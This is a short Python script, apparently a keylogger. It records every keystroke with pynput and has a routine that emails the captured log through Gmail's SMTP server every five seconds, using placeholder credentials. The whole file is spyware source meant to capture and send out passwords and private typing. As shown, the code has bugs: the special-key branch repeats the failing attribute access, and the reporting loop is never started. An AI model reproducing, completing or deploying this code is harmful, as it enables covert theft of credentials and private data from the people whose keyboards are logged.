#!/usr/bin/env python

from pynput import keyboard
import threading
import smtplib


log = ""


def process_key(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key.char) + " "


def send_email(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


def report():
    global log
    send_email("email", "pass", "\n\n" + log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


key_listener = keyboard.Listener(on_press=process_key)
with key_listener:
    key_listener.join()
